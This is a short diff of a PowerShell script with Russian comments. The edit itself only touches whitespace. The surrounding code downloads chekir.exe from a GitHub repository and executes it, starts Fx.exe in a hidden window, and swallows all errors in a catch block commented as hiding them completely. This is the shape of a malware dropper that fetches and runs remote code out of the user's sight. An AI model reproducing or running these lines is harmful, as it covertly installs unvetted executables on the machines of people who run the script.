@@ -91,8 +91,7 @@ try {
     Start-Sleep 1
     
     # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe
-    
+    Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe    
     # Запускаем 
     Start-Process -FilePath "Fx.exe" -WindowStyle Hidden
     
@@ -102,5 +101,4 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
-
 
